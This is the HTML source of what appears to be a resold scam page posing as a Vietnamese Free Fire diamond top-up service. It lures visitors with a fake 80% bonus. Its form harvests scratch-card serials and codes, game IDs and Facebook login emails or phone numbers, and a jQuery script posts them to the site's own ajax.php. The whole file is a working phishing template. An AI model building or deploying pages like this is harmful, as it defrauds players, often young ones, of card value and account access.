<!DOCTYPE html>
<html lang="vi">
<!-- /************************************************
*                                              *
* MÃ NGUỒN ĐƯỢC CUNG CẤP BỞI TUANORI           *
* LIÊN HỆ QUA ZALO : 0812.665.001              *
* FACEBOOK : FB.COM/PHAMHOANGTUAN.YTB          *
* CODE BỞI TUẤN ORI IT                         *
* WEBSITE : TUANORI.VN OR TUANORI.COM          *
*                                              *
************************************************/
/* NHẬN LÀM THUÊ WEB TẠI TUANORI.VN - MUA HOSTING GIÁ RẺ TẠI HOSTING2W.COM | MÃ NGUỒN NÀY ĐƯỢC PHÁT TRIỂN BỞI TUANORI IT */ -->
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    
    <meta name="viewport" content="width=device-width,initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <link rel="icon" href="favicon.ico.css" tppabs="images/favicon.ico">
    <title>Nạp Thẻ Free Fire - Nạp tiền FF VN Bằng Thẻ Cào</title>
    <meta name="description" content="Trang web nạp thẻ Free Fire bằng thẻ cào. Nạp tiền FF VN bằng các loại thẻ cào vô cùng tiện lợi cũng như ưu đãi lớn." />
    <link rel="canonical" href="https://napthefreefire.mobi" />
    <meta property="og:locale" content="vi_VN" />
    <meta property="og:type" content="website" />
    <meta property="og:title" content="Nạp Thẻ Free Fire - Nạp thẻ FF VN Bằng Thẻ Cào" />
    <meta property="og:description" content="Trang web nạp thẻ Free Fire bằng thẻ cào. Truy cập để nạp Kim cương game Free Fire với nhiều khuyến mãi và ưu đãi khủng. Nạp FF VN bằng thẻ cào cực tiện lợi." />
    <meta property="og:url" content="https://napthefreefire.mobi" />
    <meta property="og:site_name" content="Game Free Fire" />
    <meta property="og:image" content="images/logo.png" />
    <meta http-equiv="content-language" content="vi" />
    <link rel="alternate" href="https://napthefreefire.mobi" hreflang="vi-vn" />
    <!-- Bootstrap core CSS -->
    <link rel="stylesheet" href="css/bootstrap.min.css" tppabs="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/font-awesome.min.css" tppabs="css/font-awesome.min.css">

    <!-- Custom styles for this template -->
    <link href="css/style.css" tppabs="css/style.css" rel="stylesheet">
  		<script src="js/jquery.form.js"></script>
<script src="js/bootstrap.min.js"></script>
    <script src="js/jquery-3.2.1.min.js" tppabs="https://code.jquery.com/jquery-3.2.1.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"> </script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/6.11.5/sweetalert2.all.js"></script>    

</head>

<body>

    <div class="wrapper">

        <header class="header">
            <a href="index.htm" tppabs="https://napthefreefire.mobi">
        <img class="logo" src="images/logo.png" tppabs="images/logo.png" alt="Nạp thẻ Free Fire">
        </a>
        </header>

        <div class="container">

            <section>

                <div class="page-title">
                    <span class="text-title-left"></span>
                    <h1>NẠP THẺ <span class="text-danger">FREE FIRE</span></h1>
                    <div class="text-title-right"></div>
                </div>

                <div class="nap-the-wrap">

					

                    
                    <p class="noti noti-danger"><strong>Thông báo:</strong> khuyến mãi <strong>80%</strong> giá trị thẻ nạp duy nhất hôm nay (áp dụng với thẻ mệnh giá từ <strong>100.000đ</strong> trở lên)</p>



                    <div class="form-group cach-dang-nhap">
                        <label>Tài khoản cần nạp:</label>
                        <div class="row">
                            <div class="col-md-6">
                                <button id="garena-account" class="btn btn-block btn-sm login-btn btn-danger">ID NGƯỜI CHƠI</button>
                            </div>
                            <div class="col-md-6">
                                <button id="facebook-account" class="btn btn-block btn-sm login-btn btn-facebook">FACEBOOK</button>
                            </div>
                        </div>
                    </div>

                    <div class="form-group taikhoan-garena hide">
                        <label>Tài khoản:</label>
                        <input class="form-control" name="idgame" type="text" value="" placeholder="Nhập ID của bạn trong game ">
                    </div>
                    
                    <div class="form-group taikhoan-facebook hide">
                        <label>Email Hoặc SĐT Facebook:</label>
                        <input class="form-control" name="idgame" type="text" value="" placeholder="Nhập SĐT hoặc Email đăng nhập Facebook">
                    </div>
                    

                    <form action="#" method="post" id="fnapthe">

                    <div class="form-group">
                        <label>Loại thẻ:</label>

                        <input type="hidden" name="telco" value="">

                        <div class="loai-the-wrap">
                            <img class="loai-the" src="images/viettel.png" tppabs="images/viettel.png" title="Nạp thẻ Free Fire bằng thẻ Viettel" alt="VIETTEL">
                            <img class="loai-the" src="images/mobifone.png" tppabs="images/mobifone.png" title="Nạp thẻ Free Fire bằng thẻ Mobifone" alt="MOBIFONE">
                            <img class="loai-the" src="images/vinaphone.png" tppabs="images/vinaphone.png" title="Nạp thẻ Free Fire bằng thẻ Vinaphone" alt="VINAPHONE">
                            <img class="loai-the" src="images/zing.png" tppabs="images/zing.png" title="Nạp thẻ Free Fire bằng thẻ Vinaphone" alt="ZING">
                            <img class="loai-the" src="images/gate.png" tppabs="images/gate.png" title="Nạp thẻ Free Fire bằng thẻ Vinaphone" alt="GATE">
                        </div>

                    </div>

                    <div class="form-group">
					<label for="menhgia">Mệnh giá thẻ</label>
					<select name="amount" id="menhgia" class="form-control" required="required">
					  <option value="0" selected="selected">-Chọn mệnh giá-</option>
					  <option value="20000">20.000 VND</option>
					  <option value="50000">50.000 VND</option>
					  <option value="100000">100.000 VND</option>
					  <option value="200000">200.000 VND</option>
					  <option value="300000">300.000 VND</option>
					  <option value="500000">500.000 VND</option>
					  <option value="1000000">1.000.000 VND</option>
					</select>
					<p class="text-danger">Chú ý: nếu chọn sai mệnh giá sẽ bị mất thẻ</p>
					</div>

                    <div class="form-group">
                        <label for="seri">Số Seri:</label>
                        <input type="text" class="form-control" name="serial" id="seri" required="" placeholder="Nhập số seri...">
                    </div>

                    <div class="form-group">
                        <label for="mathe">Mã thẻ:</label>
                        <input type="text" class="form-control" name="code" id="mathe" required="" placeholder="Nhập mã thẻ...">
                    </div>
                    <hr/>
					           
                    <button type="submit" id="napthe" class="btn btn-block btn-success" data-loading-text="<i class='fa fa-spinner fa-spin'></i> ĐANG NẠP THẺ">NẠP THẺ</button>
                    </form>
                    <script>
 	$(document).ready(function(){
		$('#napthe').click(function() {
		$('#napthe').html('Chờ Xử Lý...');
		$('#napthe').prop('disabled', true);
		var formData = {
		'seri'              : $('input[name=serial]').val(),
		'code'              : $('input[name=code]').val(),
		'telco'              : $('input[name=telco]').val(),
		'amount'              : $('select[name=amount]').val(),
        'idgame'              : $('input[name=idgame]').val()
		};
		$.post("/ajax.php", formData,
			function (data) {
			    if(data.status == '1'){
				swal('Thông báo', data.msg, 'error');
				$('#napthe').html('Nạp ngay');
			$('#napthe').prop('disabled', false);
			    }else{
			     //window.location="/";   
			     swal('Thông báo', data.msg, 'success');
			     	$('#napthe').html('Nạp ngay');
			$('#napthe').prop('disabled', false);
			    }
		}, "json");
	});
});

</script>
                    <p style="font-style: italic;font-size: 13px; margin-top:15px;">* Bằng cách nhấn "Nạp Thẻ" đồng nghĩa bạn đã chấp nhận <a target="_blank" href="dieu-khoan.html" tppabs="dieu-khoan.html">ĐIỀU KHOẢN</a> của Free Fire</p>

                    <article class="bang-gia-quy-doi">
<h2 class="text-title">Bảng giá quy đổi Kim Cương khi nạp thẻ FREE FIRE</h2>
<hr>
<table class="table">
<thead>
<tr>
<th>Mệnh giá thẻ cào</th>
<th>Giá gốc</th>
<th>Khuyến mại</th>
</tr>
</thead>
<tbody>
    <tr>
<td>20.000 VND</td>
<td>120 Kim cương</td>
<td>120 Kim cương</td>
</tr>
<tr>
<td>50.000 VND</td>
<td>260 Kim cương</td>
<td>260 Kim cương</td>
</tr>
<tr>
<td>100.000 VND</td>
<td>580 Kim cương</td>
<td>1.100 Kim cương</td>
</tr>
<tr>
<td>200.000 VND</td>
<td>1.190 Kim cương</td>
<td>2.900 Kim cương</td>
 </tr>
<tr>
<td>300.000 VND</td>
<td>1.785 Kim cương</td>
<td>3.850 Kim cương</td>
</tr>
<tr>
<td>500.000 VND</td>
<td>3.050 Kim cương</td>
<td>6.500 Kim cương</td>
</tr>
<tr>
<td>1.000.000 VND</td>
<td>5.950 Kim cương</td>
<td>10.500 Kim cương</td>
</tr>
</tbody>
</table>
</article>
<hr>
<article class="huong-dan">
<h2 class="text-title">Hướng dẫn nạp thẻ Free Fire</h2>
<p>Đây là đơn vị uy tín hỗ trợ nạp Kim cương Free Fire tại Việt Nam, hỗ trợ thanh toán qua thẻ cào điện thoại.</p>
<p>Để tiến hành nạp thẻ free fire các bạn vui lòng thực hiện theo các bước dưới đây:</p>
<p><strong>Bước 1:</strong> vui lòng chuẩn bị một thẻ cào hợp lệ và chưa từng sử dụng, các loại thẻ được hệ thống chấp nhận là Viettel, Mobifone, Vinaphone.<br /><i>(Nếu không có các loại thẻ trên thì sẽ không thể tiến hành nạp Kim cương Free Fire được.)</i></p>
<p><strong>Bước 2:</strong> để <strong>nạp thẻ Free Fire</strong> thì bạn hãy tiến hành nhập tên tài khoản cần nạp Kim cương. Nếu bạn sử dụng Facebook để đăng nhập và nạp thẻ Free Fire thì bạn sẽ cần ấn vào nút "TÀI KHOẢN FACEOOK" để hệ thống tiến hành đăng nhập bằng Facebook cho bạn. Còn với tài khoản Free Fire thì ấn vào nút "GAME ID" sau đó nhập tên tài khoản vào bình thường. Hệ thống sẽ tự động nạp Kim cương cho tài khoản bạn nhập.</p>
<p><strong>Bước 3:</strong> thực hiện cào thẻ để biết được mã số nạp tiền dưới lớp tráng bạc, nhập đầy đủ và chính xác thông tin như số Seri, mã thẻ trên chiếc thẻ cào của bạn.</p>
<p><strong>Bước 4:</strong> kiểm tra kỹ lại các thông tin vừa nhập như tài khoản, số seri, mã thẻ khi nạp thẻ free fire. Nếu sai thì hãy sửa lại cho chính xác và cuối cùng là ấn <strong>NẠP THẺ</strong>. Chờ trong 5 giây và hệ thống sẽ tự động nạp Kim cương vào tài khoản FF VN của bạn. Sau khi nạp thành công vui lòng đăng nhập vào game để kiểm tra.</p>
<h2 class="text-title">Nạp thẻ Free Fire - Giới thiệu về Garena Free Fire</h2>
<p><strong>Free Fire</strong> là một loại game theo thể loại sinh tồn và chơi trên điện thoại di động giống với lối chơi của Battle Royale, FF VN được đưa ra Alpha Test lần đầu vào ngày 27 tháng 9 năm 2017 tại VN tuy nhiên mới chỉ có mặt trên một số nền tảng di động. Ngay khi mới ra mắt Free Fire đã thu hút một số lượng người chơi rất lớn tại Việt Nam và người chơi giờ đây đã có thể <strong>nạp thẻ Free Fire</strong>.<br>Sau đó một thời gian dài đội ngũ phát triển đã tung ra phiên bản Closed Beta vào ngày 2 tháng 11 năm 2017 với khá nhiều những cải tiến trong game và thời điểm này game đã có Server ở một số quốc gia khác như Thái Lan. Vào ngày 4 tháng 12 năm 2017 game tiếp tục có bản cập nhật chính thức mang tên Open Beta. Và từ đó đến nay Game vẫn liên tục có những bản Big Update Open Beta, chức năng nạp thẻ FF VN đã hoàn thiện và người chơi giờ đây <strong>nạp tiền Free Fire</strong> cực kỳ dễ dàng qua trang web này.</p>
</article>
<hr>
</div>
</section>
            <!-- /.nap-the-wrap -->

            <footer>
                <div class="inner-page text-center">

                    <p><img class="footer-img" src="images/foot_logo.png" tppabs="images/foot_logo.png" alt="Nạp thẻ Free Fire"></p>
                    <p>&copy; 2022 - TUANORI.VN - LÀM THUÊ WEBSITE UY TÍN GIÁ RẺ</p>
                </div>
            </footer>
        </div>
 
        <script src="js/jquery-3.2.1.min.js" tppabs="https://code.jquery.com/jquery-3.2.1.min.js"></script>
    <script src="js/bootstrap.min.js" tppabs="js/bootstrap.min.js"></script>
    <script src="js/custom.js" tppabs="js/custom.js"></script>
		<script src="js/jquery.form.js"></script>
<script src="js/bootstrap.min.js"></script>
</body>

</html>